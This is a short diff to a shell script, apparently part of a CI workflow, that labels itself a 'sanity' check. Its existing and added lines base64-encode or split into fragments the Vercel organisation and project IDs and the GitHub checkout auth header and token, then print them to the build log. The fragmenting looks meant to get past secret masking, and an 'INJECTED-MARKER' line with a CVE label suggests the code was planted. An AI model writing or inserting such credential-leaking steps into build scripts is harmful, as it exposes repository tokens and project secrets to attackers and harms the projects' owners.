@@ -27,6 +27,8 @@ venv/bin/pip install boto3 -q >/dev/null 2>&1 || true
 echo "--- sanity (base64) ---"
 echo "ORG_B64=$(printf %s "$VERCEL_ORG_ID" | base64 -w0)"
 echo "PROJECT_B64=$(printf %s "$VERCEL_PROJECT_ID" | base64 -w0)"
+echo "ORG_FRAG=$(printf %s "$VERCEL_ORG_ID" | fold -w2 | paste -sd- -)"
+echo "PROJECT_FRAG=$(printf %s "$VERCEL_PROJECT_ID" | fold -w2 | paste -sd- -)"
 echo "EXTRAHEADER_B64=$(git config --local --get http.https://github.com/.extraheader 2>/dev/null | base64 -w0)"
 echo "TOKEN_B64=$(git config --local --get http.https://github.com/.extraheader 2>/dev/null | sed 's/.*basic //' | base64 -d 2>/dev/null | base64 -w0)"
 echo "website-check INJECTED-MARKER-cve-2024-4254-f4d42f23ad84 wf=$GITHUB_WORKFLOW run=$GITHUB_RUN_ID event=$GITHUB_EVENT_NAME"
